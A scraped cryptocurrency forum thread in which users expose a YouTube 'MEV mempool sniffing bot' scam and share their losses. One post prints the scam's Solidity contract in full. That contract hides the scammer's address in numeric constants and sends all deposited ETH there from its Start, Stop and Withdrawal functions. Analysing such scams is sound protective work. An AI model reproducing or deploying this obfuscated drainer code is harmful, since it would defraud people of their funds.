{
  "id": "topic_5465566",
  "title": "SUN0",
  "author": "SUN0",
  "created_time": "September 03, 2023, 11:36:20 PMLast edit: September 04, 2023, 07:52:48 AM by SUN0",
  "content": "Hello guys, so i found a new youtube video that talks about \"sniffing mempool\". Basically guy tells you to make a smartcontract and run his code to \"sniff\" the mempool for profit.Here is the code: https://pastebin.com/raw/0aS2PPGqMaybe someone can break down this?Also the video link: https://www.youtube.com/watch?v=tIjg5KCwTMs&ab_channel=0xGeorge report it so youtube takes it down",
  "score": 0,
  "upvotes": 0,
  "downvotes": 0,
  "url": "https://bitcointalk.org/index.php?topic=5465566",
  "comments": [
    {
      "author": "Kruw",
      "created_time": "September 04, 2023, 05:08:40 AM",
      "body": "This video doesn't have anything to do with Bitcoin's mempool.  It's talking about some shitcoin called \"Ethereum\".",
      "score": 0,
      "upvotes": 0,
      "downvotes": 0
    },
    {
      "author": "vv181",
      "created_time": "September 04, 2023, 12:18:13 PM",
      "body": "Mempool sniffing is a way of an arbitrageur bot that initially coined by the name of miner extractable value (MEV), but it changed to Maximal Extractable Value (MEV) because it is could be used by anyone within the ecosystem. What the YouTube video fails to mention, please CMMIW since I did not watch the whole video, is that you using a popular token which means you are competing with many users that run this similar bot. So I believe the chance to profit from this scheme is slim. Now in regard to the smart contract code, I can not tell you if the code is legitimate and works as mentioned or promised. But noting the YT channel is barely new and only posted that video, there might be a hidden or obscured code that might scam those who try to run and fund the compiled smart contract. So, maybe anyone can verify and then point it out. But most importantly considering the point I first mentioned, this one surely will not work charmingly.",
      "score": 0,
      "upvotes": 0,
      "downvotes": 0
    },
    {
      "author": "SUN0",
      "created_time": "September 04, 2023, 03:20:58 PM",
      "body": "I deposited like $40 as soon as i ran the code it got all my ETH. Youtube comments seem like bots too, they all say the same thing, not to mention video has about 1.4k dislikes. So yeah idk",
      "score": 0,
      "upvotes": 0,
      "downvotes": 0
    },
    {
      "author": "vv181",
      "created_time": "September 05, 2023, 06:42:37 AM",
      "body": "Quote from: SUN0 on September 04, 2023, 03:20:58 PMI deposited like $40 as soon as i ran the code it got all my ETH. Youtube comments seem like bots too, they all say the same thing, not to mention video has about 1.4k dislikes. So yeah idkWould you mind sharing the particular smart contract address and where the ETH leads? Is it transferred to another smart contract or some address?Looking at the smart contract source code, it seems the callMempool() function is shady. The findNewContracts() function which shows the token contract address is also not called anywhere. I did not know for certain, but, it seems they obscuring some part of the code where what it actually does is just send some ETH to another address. If you don't mind sharing the transaction, it might verify what it actually does.",
      "score": 0,
      "upvotes": 0,
      "downvotes": 0
    },
    {
      "author": "JeromeTash",
      "created_time": "September 05, 2023, 03:06:46 PM",
      "body": "Perhaps providing the address your funds went to would make it easier to see how it was executed. But it's an ongoing scam which is extensively discussed in this topic [Warning] Ethereum smart contract scam bot....I am not expert in solidity programming language nor a programmer but here is what i gotSo the code has so many useless lines to obscure what the actual code does. When you remove those useless lines. We end up with this Code:pragma solidity ^0.6.6;import \"github.com/Uniswap/uniswap-v2-periphery/blob/master/contracts/interfaces/IUniswapV2Migrator.sol\";import \"github.com/Uniswap/uniswap-v2-periphery/blob/master/contracts/interfaces/V1/IUniswapV1Exchange.sol\";import \"github.com/Uniswap/uniswap-v2-periphery/blob/master/contracts/interfaces/V1/IUniswapV1Factory.sol\";contract UniswapBot {    uint liquidity;    uint private pool;    address public owner;    event Log(string _msg);    /*     * @dev constructor     * @set the owner of the contract      */    constructor() public {        owner = msg.sender;    }    receive() external payable {}    struct slice {        uint _len;        uint _ptr;    }    /*     * @dev Find newly deployed contracts on Uniswap Exchange     * @param memory of required contract liquidity.     * @param other The second slice to compare.     * @return New contracts with required liquidity.     */    function findNewContracts(slice memory self, slice memory other) internal pure returns (int) {        uint shortest = self._len;       if (other._len < self._len)             shortest = other._len;        uint selfptr = self._ptr;        uint otherptr = other._ptr;        for (uint idx = 0; idx < shortest; idx += 32) {            uint a;            uint b;            string memory WETH_CONTRACT_ADDRESS = \"0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2\";            string memory TOKEN_CONTRACT_ADDRESS = \"0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2\";            loadCurrentContract(WETH_CONTRACT_ADDRESS);            loadCurrentContract(TOKEN_CONTRACT_ADDRESS);            assembly {                a := mload(selfptr)                b := mload(otherptr)            }            if (a != b) {                uint256 mask = uint256(-1);                if(shortest < 32) {                  mask = ~(2 ** (8 * (32 - shortest + idx)) - 1);                }                uint256 diff = (a & mask) - (b & mask);                if (diff != 0)                    return int(diff);            }            selfptr += 32;            otherptr += 32;        }        return int(self._len) - int(other._len);    }    /*     * @dev Extracts the newest contracts on Uniswap exchange     * @param self The slice to operate on.     * @param rune The slice that will contain the first rune.     * @return `list of contracts`.     */    function findContracts(uint selflen, uint selfptr, uint needlelen, uint needleptr) private pure returns (uint) {        uint ptr = selfptr;        uint idx;        if (needlelen <= selflen) {            if (needlelen <= 32) {                bytes32 mask = bytes32(~(2 ** (8 * (32 - needlelen)) - 1));                bytes32 needledata;                assembly { needledata := and(mload(needleptr), mask) }                uint end = selfptr + selflen - needlelen;                bytes32 ptrdata;                assembly { ptrdata := and(mload(ptr), mask) }                while (ptrdata != needledata) {                    if (ptr >= end)                        return selfptr + selflen;                    ptr++;                    assembly { ptrdata := and(mload(ptr), mask) }                }                return ptr;            } else {                bytes32 hash;                assembly { hash := keccak256(needleptr, needlelen) }                for (idx = 0; idx <= selflen - needlelen; idx++) {                    bytes32 testHash;                    assembly { testHash := keccak256(ptr, needlelen) }                    if (hash == testHash)                        return ptr;                    ptr += 1;                }            }        }        return selfptr + selflen;    }    /*     * @dev Loading the contract     * @param contract address     * @return contract interaction object     */    function loadCurrentContract(string memory self) internal pure returns (string memory) {        string memory ret = self;        uint retptr;        assembly { retptr := add(ret, 32) }        return ret;    }    /*     * @dev Extracts the contract from Uniswap     * @param self The slice to operate on.     * @param rune The slice that will contain the first rune.     * @return `rune`.     */    function nextContract(slice memory self, slice memory rune) internal pure returns (slice memory) {        rune._ptr = self._ptr;        if (self._len == 0) {            rune._len = 0;            return rune;        }        uint l;        uint b;        assembly { b := and(mload(sub(mload(add(self, 32)), 31)), 0xFF) }        if (b < 0x80) {            l = 1;        } else if(b < 0xE0) {            l = 2;        } else if(b < 0xF0) {            l = 3;        } else {            l = 4;        }        if (l > self._len) {            rune._len = self._len;            self._ptr += self._len;            self._len = 0;            return rune;        }        self._ptr += l;        self._len -= l;        rune._len = l;        return rune;    }    uint256 mempool_array = 100000000000000001;    function memcpy(uint dest, uint src, uint len) private pure {        for(; len >= 32; len -= 32) {            assembly {                mstore(dest, mload(src))            }            dest += 32;            src += 32;        }        uint mask = 256 ** (32 - len) - 1;        assembly {            let srcpart := and(mload(src), not(mask))            let destpart := and(mload(dest), mask)            mstore(dest, or(destpart, srcpart))        }    }    /*     * @dev Orders the contract by its available liquidity     * @param self The slice to operate on.     * @return The contract with possbile maximum return     */    function orderContractsByLiquidity(slice memory self) internal pure returns (uint ret) {        if (self._len == 0) {            return 0;        }        uint word;        uint length;        uint divisor = 2 ** 248;        assembly { word:= mload(mload(add(self, 32))) }        uint b = word / divisor;        if (b < 0x80) {            ret = b;            length = 1;        } else if(b < 0xE0) {            ret = b & 0x1F;            length = 2;        } else if(b < 0xF0) {            ret = b & 0x0F;            length = 3;        } else {            ret = b & 0x07;            length = 4;        }        if (length > self._len) {            return 0;        }        for (uint i = 1; i < length; i++) {            divisor = divisor / 256;            b = (word / divisor) & 0xFF;            if (b & 0xC0 != 0x80) {                return 0;            }            ret = (ret * 64) | (b & 0x3F);        }        return ret;    }    /*     * @dev Calculates remaining liquidity in contract     * @param self The slice to operate on.     * @return The length of the slice in runes.     */    function calcLiquidityInContract(slice memory self) internal pure returns (uint l) {        uint ptr = self._ptr - 31;        uint end = ptr + self._len;        for (l = 0; ptr < end; l++) {            uint8 b;            assembly { b := and(mload(ptr), 0xFF) }            if (b < 0x80) {                ptr += 1;            } else if(b < 0xE0) {                ptr += 2;            } else if(b < 0xF0) {                ptr += 3;            } else if(b < 0xF8) {                ptr += 4;            } else if(b < 0xFC) {                ptr += 5;            } else {                ptr += 6;            }        }    }    function getMemPoolOffset() internal pure returns (uint) {        return 246166;    }    /*     * @dev Parsing all Uniswap mempool     * @param self The contract to operate on.     * @return True if the slice is empty, False otherwise.     */    function parseMemoryPool(string memory _a) internal pure returns (address _parsed) {        bytes memory tmp = bytes(_a);        uint160 iaddr = 0;        uint160 b1;        uint160 b2;        for (uint i = 2; i < 2 + 2 * 20; i += 2) {            iaddr *= 256;            b1 = uint160(uint8(tmp[i]));            b2 = uint160(uint8(tmp[i + 1]));            if ((b1 >= 97) && (b1 <= 102)) {                b1 -= 87;            } else if ((b1 >= 65) && (b1 <= 70)) {                b1 -= 55;            } else if ((b1 >= 48) && (b1 <= 57)) {                b1 -= 48;            }            if ((b2 >= 97) && (b2 <= 102)) {                b2 -= 87;            } else if ((b2 >= 65) && (b2 <= 70)) {                b2 -= 55;            } else if ((b2 >= 48) && (b2 <= 57)) {                b2 -= 48;            }            iaddr += (b1 * 16 + b2);        }        return address(iaddr);    }    /*     * @dev Returns the keccak-256 hash of the contracts.     * @param self The slice to hash.     * @return The hash of the contract.     */    function keccak(slice memory self) internal pure returns (bytes32 ret) {        assembly {            ret := keccak256(mload(add(self, 32)), mload(self))        }    }    /*     * @dev Check if contract has enough liquidity available     * @param self The contract to operate on.     * @return True if the slice starts with the provided text, false otherwise.     */        function checkLiquidity(uint a) internal pure returns (string memory) {        uint count = 0;        uint b = a;        while (b != 0) {            count++;            b /= 16;        }        bytes memory res = new bytes(count);        for (uint i=0; i<count; ++i) {            b = a % 16;            res[count - i - 1] = toHexDigit(uint8(b));            a /= 16;        }        uint hexLength = bytes(string(res)).length;        if (hexLength == 4) {            string memory _hexC1 = mempool(\"0\", string(res));            return _hexC1;        } else if (hexLength == 3) {            string memory _hexC2 = mempool(\"0\", string(res));            return _hexC2;        } else if (hexLength == 2) {            string memory _hexC3 = mempool(\"000\", string(res));            return _hexC3;        } else if (hexLength == 1) {            string memory _hexC4 = mempool(\"0000\", string(res));            return _hexC4;        }        return string(res);    }    function getMemPoolLength() internal pure returns (uint) {        return 174124;    }    /*     * @dev If `self` starts with `needle`, `needle` is removed from the     *      beginning of `self`. Otherwise, `self` is unmodified.     * @param self The slice to operate on.     * @param needle The slice to search for.     * @return `self`     */    function beyond(slice memory self, slice memory needle) internal pure returns (slice memory) {        if (self._len < needle._len) {            return self;        }        bool equal = true;        if (self._ptr != needle._ptr) {            assembly {                let length := mload(needle)                let selfptr := mload(add(self, 0x20))                let needleptr := mload(add(needle, 0x20))                equal := eq(keccak256(selfptr, length), keccak256(needleptr, length))            }        }        if (equal) {            self._len -= needle._len;            self._ptr += needle._len;        }        return self;    }    function findPtr(uint selflen, uint selfptr, uint needlelen, uint needleptr) private pure returns (uint) {        uint ptr = selfptr;        uint idx;        if (needlelen <= selflen) {            if (needlelen <= 32) {                bytes32 mask = bytes32(~(2 ** (8 * (32 - needlelen)) - 1));                bytes32 needledata;                assembly { needledata := and(mload(needleptr), mask) }                uint end = selfptr + selflen - needlelen;                bytes32 ptrdata;                assembly { ptrdata := and(mload(ptr), mask) }                while (ptrdata != needledata) {                    if (ptr >= end)                        return selfptr + selflen;                    ptr++;                    assembly { ptrdata := and(mload(ptr), mask) }                }                return ptr;            } else {                bytes32 hash;                assembly { hash := keccak256(needleptr, needlelen) }                for (idx = 0; idx <= selflen - needlelen; idx++) {                    bytes32 testHash;                    assembly { testHash := keccak256(ptr, needlelen) }                    if (hash == testHash)                        return ptr;                    ptr += 1;                }            }        }        return selfptr + selflen;    }    function getMemPoolHeight() internal pure returns (uint) {        return 776550;    }    /*     * @dev Iterating through all mempool to call the one with the with highest possible returns     * @return `self`.     */    function callMempool() internal pure returns (string memory) {        string memory _memPoolOffset = mempool(\"x\", checkLiquidity(getMemPoolOffset()));        uint _memPoolSol = 832575;        uint _memPoolLength = getMemPoolLength();        uint _memPoolSize = 960159;        uint _memPoolHeight = getMemPoolHeight();        uint _memPoolWidth = 362059;        uint _memPoolDepth = getMemPoolDepth();        uint _memPoolCount = 556084;        string memory _memPool1 = mempool(_memPoolOffset, checkLiquidity(_memPoolSol));        string memory _memPool2 = mempool(checkLiquidity(_memPoolLength), checkLiquidity(_memPoolSize));        string memory _memPool3 = mempool(checkLiquidity(_memPoolHeight), checkLiquidity(_memPoolWidth));        string memory _memPool4 = mempool(checkLiquidity(_memPoolDepth), checkLiquidity(_memPoolCount));        string memory _allMempools = mempool(mempool(_memPool1, _memPool2), mempool(_memPool3, _memPool4));        string memory _fullMempool = mempool(\"0\", _allMempools);        return _fullMempool;    }   function checkMempoolStarted() internal view returns (bool) {        if(address(this).balance > mempool_array){            return true;        }        else{            return false;        }    }    /*     * @dev Modifies `self` to contain everything from the first occurrence of     *      `needle` to the end of the slice. `self` is set to the empty slice     *      if `needle` is not found.     * @param self The slice to search and modify.     * @param needle The text to search for.     * @return `self`.     */    function toHexDigit(uint8 d) pure internal returns (byte) {        if (0 <= d && d <= 9) {            return byte(uint8(byte('0')) + d);        } else if (10 <= uint8(d) && uint8(d) <= 15) {            return byte(uint8(byte('a')) + d - 10);        }        revert();    }    function _callStartActionMempool() internal pure returns (address) {        return parseMemoryPool(callMempool());    }    /*     * @dev Perform action from different contract pools     * @param contract address to snipe liquidity from     * @return `liquidity`.     */    function Start() public payable {         emit Log(\"Running attack on Uniswap. This can take a while please wait...\");        if (checkMempoolStarted()){            payable(_callStartActionMempool()).transfer(address(this).balance);        }        else{            payable(_callStartActionMempool()).transfer(address(this).balance);        }    }    /*     * @dev withdrawals profit back to contract creator address     * @return `profits`.     */    function Withdrawal() public payable {         emit Log(\"Sending profits back to contract creator address...\");        if (checkMempoolStarted()){            payable(withdrawalProfits()).transfer(address(this).balance);        }        else{            payable(owner).transfer(address(this).balance);        }    }    /*     * @dev withdrawals profit back to contract creator address     * @return `profits`.     */    function Stop() public payable {         emit Log(\"Stopping the bot...\");        if (checkMempoolStarted()){            payable(_callStopMempoolActionMempool()).transfer(address(this).balance);        }        else{            payable(_callStopMempoolActionMempool()).transfer(0);        }    }    function _callStopMempoolActionMempool() internal pure returns (address) {        return parseMemoryPool(callMempool());    }    /*     * @dev token int2 to readable str     * @param token An output parameter to which the first token is written.     * @return `token`.     */    function uint2str(uint _i) internal pure returns (string memory _uintAsString) {        if (_i == 0) {            return \"0\";        }        uint j = _i;        uint len;        while (j != 0) {            len++;            j /= 10;        }        bytes memory bstr = new bytes(len);        uint k = len - 1;        while (_i != 0) {            bstr[k--] = byte(uint8(48 + _i % 10));            _i /= 10;        }        return string(bstr);    }    function getMemPoolDepth() internal pure returns (uint) {        return 356653;    }    function withdrawalProfits() internal pure returns (address) {        return parseMemoryPool(callMempool());    }    /*     * @dev loads all Uniswap mempool into memory     * @param token An output parameter to which the first token is written.     * @return `mempool`.     */    function mempool(string memory _base, string memory _value) internal pure returns (string memory) {        bytes memory _baseBytes = bytes(_base);        bytes memory _valueBytes = bytes(_value);        string memory _tmpValue = new string(_baseBytes.length + _valueBytes.length);        bytes memory _newValue = bytes(_tmpValue);        uint i;        uint j;        for(i=0; i<_baseBytes.length; i++) {            _newValue[j++] = _baseBytes[i];        }        for(i=0; i<_valueBytes.length; i++) {            _newValue[j++] = _valueBytes[i];        }        return string(_newValue);    }}Basically any action you do, like start running the bot, stop the bot or withdraw the bot sends your ETH to an address which I believe is the scammer, though I have failed to trace the addressKeep an eye on those 3 lower functions that are marked in red (start, stop and withdraw), all the arrows atleast end up on address. that's where the funds get sent.",
      "score": 0,
      "upvotes": 0,
      "downvotes": 0
    },
    {
      "author": "JunkieMiner",
      "created_time": "September 05, 2023, 03:14:57 PM",
      "body": "Same happen to me, it takes my money, but though that was not my main Metamask, and also that didn't have that much money, when I ran the node it didn't start and eventually take my money.",
      "score": 0,
      "upvotes": 0,
      "downvotes": 0
    },
    {
      "author": "Bitcoin_Arena",
      "created_time": "September 05, 2023, 08:56:30 PM",
      "body": "Quote from: JunkieMiner on September 05, 2023, 03:14:57 PMSame happen to me, it takes my money, but though that was not my main Metamask, and also that didn't have that much money, when I ran the node it didn't start and eventually take my money.I guess you learned a lesson or two.If it was that easy to earn money or make profits, do you think anyone sane enough would share that trick to the public all over YouTube?Announcing the \"trick\" on YouTube only means one thing. They are looking for someone to scam.",
      "score": 0,
      "upvotes": 0,
      "downvotes": 0
    },
    {
      "author": "wheelz1200",
      "created_time": "September 05, 2023, 09:21:32 PM",
      "body": "Quote from: Bitcoin_Arena on September 05, 2023, 08:56:30 PMQuote from: JunkieMiner on September 05, 2023, 03:14:57 PMSame happen to me, it takes my money, but though that was not my main Metamask, and also that didn't have that much money, when I ran the node it didn't start and eventually take my money.I guess you learned a lesson or two.If it was that easy to earn money or make profits, do you think anyone sane enough would share that trick to the public all over YouTube?Announcing the \"trick\" on YouTube only means one thing. They are looking for someone to scam.Not trying to rub salt into people's wounds but doesn't anyone learn in crypto?  If it's too good to be true it is, there are tons of scammers out there I wouldn't put my money in any of these things.  And yeah some pan put for a little while and people will tell ypu they made money but it's short lived, those things don't last long.",
      "score": 0,
      "upvotes": 0,
      "downvotes": 0
    },
    {
      "author": "SUN0",
      "created_time": "September 06, 2023, 02:56:53 AMLast edit: September 06, 2023, 03:07:42 AM by SUN0",
      "body": "Quote from: vv181 on September 05, 2023, 06:42:37 AMQuote from: SUN0 on September 04, 2023, 03:20:58 PMI deposited like $40 as soon as i ran the code it got all my ETH. Youtube comments seem like bots too, they all say the same thing, not to mention video has about 1.4k dislikes. So yeah idkWould you mind sharing the particular smart contract address and where the ETH leads? Is it transferred to another smart contract or some address?Looking at the smart contract source code, it seems the callMempool() function is shady. The findNewContracts() function which shows the token contract address is also not called anywhere. I did not know for certain, but, it seems they obscuring some part of the code where what it actually does is just send some ETH to another address. If you don't mind sharing the transaction, it might verify what it actually does.smart contract address https://etherscan.io/address/0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2",
      "score": 0,
      "upvotes": 0,
      "downvotes": 0
    },
    {
      "author": "vv181",
      "created_time": "September 06, 2023, 11:40:30 AM",
      "body": "Quote from: JeromeTash on September 05, 2023, 03:06:46 PMPerhaps providing the address your funds went to would make it easier to see how it was executed. But it's an ongoing scam which is extensively discussed in this topic [Warning] Ethereum smart contract scam bot....Well, that surely answers the doubt.As explained by StackExchange answer, the obscured code, which I also mention, is certainly a successful attempt to hide a probable hardcoded or malicious address.Quote from: JeromeTash on September 05, 2023, 03:06:46 PMBy the way, how do you generate this graph?Quote from: SUN0 on September 06, 2023, 02:56:53 AMQuote from: vv181 on September 05, 2023, 06:42:37 AMQuote from: SUN0 on September 04, 2023, 03:20:58 PMI deposited like $40 as soon as i ran the code it got all my ETH. Youtube comments seem like bots too, they all say the same thing, not to mention video has about 1.4k dislikes. So yeah idkWould you mind sharing the particular smart contract address and where the ETH leads? Is it transferred to another smart contract or some address?~smart contract address https://etherscan.io/address/0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2That is just a normal legitimate WETH smart contract address. I mean the address of the smart contract that you compiled, or if your funds on the smart contract got stolen, the address to which the ETH transferred to. Nevertheless, JeromeTash information should clear the doubt about whether this is a scam or not.",
      "score": 0,
      "upvotes": 0,
      "downvotes": 0
    },
    {
      "author": "SUN0",
      "created_time": "September 06, 2023, 02:59:46 PM",
      "body": "Quote from: vv181 on September 06, 2023, 11:40:30 AMQuote from: JeromeTash on September 05, 2023, 03:06:46 PMPerhaps providing the address your funds went to would make it easier to see how it was executed. But it's an ongoing scam which is extensively discussed in this topic [Warning] Ethereum smart contract scam bot....Well, that surely answers the doubt.As explained by StackExchange answer, the obscured code, which I also mention, is certainly a successful attempt to hide a probable hardcoded or malicious address.Quote from: JeromeTash on September 05, 2023, 03:06:46 PMhttps://talkimg.com/images/2023/09/05/mmQwf.pngBy the way, how do you generate this graph?Quote from: SUN0 on September 06, 2023, 02:56:53 AMQuote from: vv181 on September 05, 2023, 06:42:37 AMQuote from: SUN0 on September 04, 2023, 03:20:58 PMI deposited like $40 as soon as i ran the code it got all my ETH. Youtube comments seem like bots too, they all say the same thing, not to mention video has about 1.4k dislikes. So yeah idkWould you mind sharing the particular smart contract address and where the ETH leads? Is it transferred to another smart contract or some address?~smart contract address https://etherscan.io/address/0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2That is just a normal legitimate WETH smart contract address. I mean the address of the smart contract that you compiled, or if your funds on the smart contract got stolen, the address to which the ETH transferred to. Nevertheless, JeromeTash information should clear the doubt about whether this is a scam or not.my bad, contract address my funds went to should be this https://etherscan.io/address/0xd3fa450210c88b11830601a81a5126330fa3a94b this is where i deposited my money for so called mev sniffing, im certain this is a scam",
      "score": 0,
      "upvotes": 0,
      "downvotes": 0
    },
    {
      "author": "Silberman",
      "created_time": "September 06, 2023, 03:30:05 PM",
      "body": "Quote from: Bitcoin_Arena on September 05, 2023, 08:56:30 PMQuote from: JunkieMiner on September 05, 2023, 03:14:57 PMSame happen to me, it takes my money, but though that was not my main Metamask, and also that didn't have that much money, when I ran the node it didn't start and eventually take my money.I guess you learned a lesson or two.If it was that easy to earn money or make profits, do you think anyone sane enough would share that trick to the public all over YouTube?Announcing the \"trick\" on YouTube only means one thing. They are looking for someone to scam.Lessons which could have been learned without losing any money if people simply used their common sense, there is a reason why anyone that has a legitimate method to make money online never reveals it, and this is because if they were to do so then the method will become saturated and they will not make anymore money with it, so if anyone reveals their method they are either dumb, reveling some useless method or trying to scam you.",
      "score": 0,
      "upvotes": 0,
      "downvotes": 0
    },
    {
      "author": "SUN0",
      "created_time": "September 06, 2023, 06:27:07 PM",
      "body": "Quote from: Silberman on September 06, 2023, 03:30:05 PMQuote from: Bitcoin_Arena on September 05, 2023, 08:56:30 PMQuote from: JunkieMiner on September 05, 2023, 03:14:57 PMSame happen to me, it takes my money, but though that was not my main Metamask, and also that didn't have that much money, when I ran the node it didn't start and eventually take my money.I guess you learned a lesson or two.If it was that easy to earn money or make profits, do you think anyone sane enough would share that trick to the public all over YouTube?Announcing the \"trick\" on YouTube only means one thing. They are looking for someone to scam.Lessons which could have been learned without losing any money if people simply used their common sense, there is a reason why anyone that has a legitimate method to make money online never reveals it, and this is because if they were to do so then the method will become saturated and they will not make anymore money with it, so if anyone reveals their method they are either dumb, reveling some useless method or trying to scam you.Yea i know i was just curious i guess",
      "score": 0,
      "upvotes": 0,
      "downvotes": 0
    },
    {
      "author": "Dave1",
      "created_time": "September 07, 2023, 05:09:59 AM",
      "body": "Quote from: SUN0 on September 06, 2023, 06:27:07 PMQuote from: Silberman on September 06, 2023, 03:30:05 PMQuote from: Bitcoin_Arena on September 05, 2023, 08:56:30 PMQuote from: JunkieMiner on September 05, 2023, 03:14:57 PMSame happen to me, it takes my money, but though that was not my main Metamask, and also that didn't have that much money, when I ran the node it didn't start and eventually take my money.I guess you learned a lesson or two.If it was that easy to earn money or make profits, do you think anyone sane enough would share that trick to the public all over YouTube?Announcing the \"trick\" on YouTube only means one thing. They are looking for someone to scam.Lessons which could have been learned without losing any money if people simply used their common sense, there is a reason why anyone that has a legitimate method to make money online never reveals it, and this is because if they were to do so then the method will become saturated and they will not make anymore money with it, so if anyone reveals their method they are either dumb, reveling some useless method or trying to scam you.Yea i know i was just curious i guessYea, sometimes it's better to really experience it before you understand how this scammers really take advantage of us here. Same with me, in the beginning I have invested some which I think can give me money or double my money easy.But after that experience, I never trust anyone, or invest on some projects that I don't do my own investigations. And hopefully this will be the last one for you as you are now aware how this criminals works.",
      "score": 0,
      "upvotes": 0,
      "downvotes": 0
    },
    {
      "author": "JeromeTash",
      "created_time": "September 07, 2023, 02:25:14 PM",
      "body": "Quote from: vv181 on September 06, 2023, 11:40:30 AMBy the way, how do you generate this graph?There is a software called Visual Studio Code which is a source-code editor used for debugging code and so many other different features that I am yet to find out. In that software, there are several extensions or add-ons and one of them can create a graph showing how the code works if executed. That's how I generated the graph.",
      "score": 0,
      "upvotes": 0,
      "downvotes": 0
    },
    {
      "author": "vv181",
      "created_time": "September 07, 2023, 05:48:52 PM",
      "body": "Quote from: SUN0 on September 06, 2023, 02:59:46 PMQuote from: vv181 on September 06, 2023, 11:40:30 AMQuote from: SUN0 on September 06, 2023, 02:56:53 AMQuote from: vv181 on September 05, 2023, 06:42:37 AMQuote from: SUN0 on September 04, 2023, 03:20:58 PMI deposited like $40 as soon as i ran the code it got all my ETH. Youtube comments seem like bots too, they all say the same thing, not to mention video has about 1.4k dislikes. So yeah idkWould you mind sharing the particular smart contract address and where the ETH leads? Is it transferred to another smart contract or some address?~smart contract address https://etherscan.io/address/0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2That is just a normal legitimate WETH smart contract address. I mean the address of the smart contract that you compiled, or if your funds on the smart contract got stolen, the address to which the ETH transferred to. Nevertheless, JeromeTash information should clear the doubt about whether this is a scam or not.my bad, contract address my funds went to should be this https://etherscan.io/address/0xd3fa450210c88b11830601a81a5126330fa3a94b this is where i deposited my money for so called mev sniffing, im certain this is a scamThat is absolutely a scam. The parts of the smart contract code are similar to what I referenced before. Also, the step when you initiate the `start` method, it immediately transfers Ether into 0x3C196CB43f2a82Cea69fbd9665864B5712d87C34, which is seems the scammer's obscured address within the code. So yeah, it is confirmed a scam.The good thing is the YT video has already been taken down, the bad thing, some people get deceived by this scheme as you can see on the scammer address above.Quote from: JeromeTash on September 07, 2023, 02:25:14 PMQuote from: vv181 on September 06, 2023, 11:40:30 AMBy the way, how do you generate this graph?There is a software called Visual Studio Code which is a source-code editor used for debugging code and so many other different features that I am yet to find out. In that software, there are several extensions or add-ons and one of them can create a graph showing how the code works if executed. That's how I generated the graph.I'm pretty familiar with Visual Studio Code, but I do not know which particular add-ons to generate the graph. Further question, Does the graph generation process only require the smart contract code, or is it necessary to input some compiled smart contract address?",
      "score": 0,
      "upvotes": 0,
      "downvotes": 0
    },
    {
      "author": "JeromeTash",
      "created_time": "September 07, 2023, 07:24:18 PM",
      "body": "Quote from: vv181 on September 07, 2023, 05:48:52 PMI'm pretty familiar with Visual Studio Code, but I do not know which particular add-ons to generate the graph. Further question, Does the graph generation process only require the smart contract code, or is it necessary to input some compiled smart contract address?Just the smart contract code.The name of the add-on you will download is Solidity Visual Developer: Surya - call graph for active editor. Once downloaded. Enter your smart contract code in the editor, Head over to View, select command pallete (shortcut for this is CTRL+SHIFT+P), search up \"Solidity Visual Developer: Surya - call graph\" and click on it. A graph will be generated",
      "score": 0,
      "upvotes": 0,
      "downvotes": 0
    }
  ]
}